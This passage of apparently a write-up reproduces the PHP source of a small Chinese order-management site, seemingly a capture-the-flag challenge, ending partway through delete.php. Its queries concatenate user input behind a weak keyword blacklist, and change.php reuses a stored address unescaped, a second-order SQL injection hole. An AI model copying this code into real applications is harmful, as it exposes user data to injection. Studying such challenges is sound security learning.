+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line">//var_dump($_POST);</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = &apos;&apos;;</span><br><span class="line">    $pattern = &apos;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&apos;;</span><br><span class="line">    $user_name = $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address = $_POST[&quot;address&quot;];</span><br><span class="line">    $phone = $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = &apos;no sql inject!&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql = &quot;select * from `user` where `user_name`=&apos;&#123;$user_name&#125;&apos; and `phone`=&apos;&#123;$phone&#125;&apos;&quot;;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if($fetch-&gt;num_rows&gt;0) &#123;</span><br><span class="line">        $msg = $user_name.&quot;已提交订单&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;</span><br><span class="line">        $re = $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);</span><br><span class="line">        $re = $re-&gt;execute();</span><br><span class="line">        if(!$re) &#123;</span><br><span class="line">            echo &apos;error&apos;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = &quot;订单提交成功&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $msg = &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;确认订单&lt;/title&gt;</span><br><span class="line">&lt;base href=&quot;./&quot;&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;h&quot;&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-zh.png&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class="line">                &lt;?php global $msg; echo &apos;&lt;h2 class=&quot;mb&quot;&gt;&apos;.$msg.&apos;&lt;/h2&gt;&apos;;?&gt;</span><br><span class="line">                &lt;a href=&quot;./index.php&quot;&gt;</span><br><span class="line">                &lt;button class=&apos;btn btn-lg  btn-sub btn-white&apos;&gt;返回&lt;/button&gt;</span><br><span class="line">                &lt;/a&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;f&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class=&quot;row&quot;&gt;</span><br><span class="line">            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;</span><br><span class="line">            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;</span><br><span class="line">            &lt;a href=&quot;./search.php&quot;&gt;</span><br><span class="line">                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;a href=&quot;./change.php&quot;&gt;</span><br><span class="line">                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;a href=&quot;./delete.php&quot;&gt;</span><br><span class="line">                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>search.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;; </span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = &apos;&apos;;</span><br><span class="line">    $pattern = &apos;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&apos;;</span><br><span class="line">    $user_name = $_POST[&quot;user_name&quot;];</span><br><span class="line">    $phone = $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = &apos;no sql inject!&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql = &quot;select * from `user` where `user_name`=&apos;&#123;$user_name&#125;&apos; and `phone`=&apos;&#123;$phone&#125;&apos;&quot;;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        if(!$row) &#123;</span><br><span class="line">            echo &apos;error&apos;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = &quot;&lt;p&gt;姓名:&quot;.$row[&apos;user_name&apos;].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row[&apos;phone&apos;].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row[&apos;address&apos;].&quot;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = &quot;未找到订单!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    $msg = &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;搜索&lt;/title&gt;</span><br><span class="line">&lt;base href=&quot;./&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;h&quot;&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class=&quot;row&quot;&gt;</span><br><span class="line">			&lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class="line">                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;</span><br><span class="line">                &lt;h1&gt;订单查询&lt;/h1&gt;</span><br><span class="line">                &lt;form method=&quot;post&quot;&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;h3&gt;姓名:&lt;/h3&gt;</span><br><span class="line">                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;电话:&lt;/h3&gt;</span><br><span class="line">                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;button class=&apos;btn btn-lg  btn-sub btn-white&apos; type=&quot;submit&quot;&gt;查询订单&lt;/button&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">                &lt;?php global $msg; echo &apos;&lt;h2 class=&quot;mb&quot;&gt;&apos;.$msg.&apos;&lt;/h2&gt;&apos;;?&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;f&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class=&quot;row&quot;&gt;</span><br><span class="line">            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;</span><br><span class="line">            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;</span><br><span class="line">            &lt;a href=&quot;./index.php&quot;&gt;</span><br><span class="line">                &lt;button class=&apos;btn btn-lg btn-register btn-sub btn-white&apos;&gt;返回&lt;/button&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;a href=&quot;./change.php&quot;&gt;</span><br><span class="line">                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;</span><br><span class="line">            &lt;/a&gt; </span><br><span class="line">            &lt;a href=&quot;./delete.php&quot;&gt;</span><br><span class="line">                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;</span><br><span class="line">            &lt;/a&gt;    </span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>change.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = &apos;&apos;;</span><br><span class="line">    $pattern = &apos;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&apos;;</span><br><span class="line">    $user_name = $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address = addslashes($_POST[&quot;address&quot;]);</span><br><span class="line">    $phone = $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = &apos;no sql inject!&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql = &quot;select * from `user` where `user_name`=&apos;&#123;$user_name&#125;&apos; and `phone`=&apos;&#123;$phone&#125;&apos;&quot;;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = &quot;update `user` set `address`=&apos;&quot;.$address.&quot;&apos;, `old_address`=&apos;&quot;.$row[&apos;address&apos;].&quot;&apos; where `user_id`=&quot;.$row[&apos;user_id&apos;];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &apos;error&apos;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = &quot;订单修改成功&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = &quot;未找到订单!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    $msg = &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;修改收货地址&lt;/title&gt;</span><br><span class="line">&lt;base href=&quot;./&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;h&quot;&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class=&quot;row&quot;&gt;</span><br><span class="line">			&lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class="line">                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;</span><br><span class="line">                &lt;h1&gt;修改收货地址&lt;/h1&gt;</span><br><span class="line">                &lt;form method=&quot;post&quot;&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;h3&gt;姓名:&lt;/h3&gt;</span><br><span class="line">                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;电话:&lt;/h3&gt;</span><br><span class="line">                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;地址:&lt;/h3&gt;</span><br><span class="line">                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;button class=&apos;btn btn-lg  btn-sub btn-white&apos; type=&quot;submit&quot;&gt;修改订单&lt;/button&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">                &lt;?php global $msg; echo &apos;&lt;h2 class=&quot;mb&quot;&gt;&apos;.$msg.&apos;&lt;/h2&gt;&apos;;?&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;f&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class=&quot;row&quot;&gt;</span><br><span class="line">            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;</span><br><span class="line">            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;</span><br><span class="line">            &lt;a href=&quot;./index.php&quot;&gt;</span><br><span class="line">                &lt;button class=&apos;btn btn-lg btn-register btn-sub btn-white&apos;&gt;返回&lt;/button&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;a href=&quot;./search.php&quot;&gt;</span><br><span class="line">                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;a href=&quot;./delete.php&quot;&gt;</span><br><span class="line">                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;/button&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>delete.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = &apos;&apos;;</span><br><span class="line">    $pattern = &apos;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&apos;;</span><br><span class="line">    $user_name = $_POST[&quot;user_name&quot;];</span><br><span class="line">    $phone = $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = &apos;no sql inject!&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql = &quot;select * from `user` where `user_name`=&apos;&#123;$user_name&#125;&apos; and `phone`=&apos;&#123;$phone&#125;&apos;&quot;;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $result = $db-&gt;query(&apos;delete from `user` where `user_id`=&apos; . $row[&quot;user_id&quot;]);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &apos;error&apos;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = &quot;订单删除成功&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = &quot;未找到订单!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    $msg = &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;删除订单&lt;/title&gt;</span><br><span class="line">&lt;base href=&quot;./&quot;&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;h&quot;&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class=&quot;row&quot;&gt;</span><br><span class="line">			&lt;div class=&quot;col-md-8 col-md-offset-2 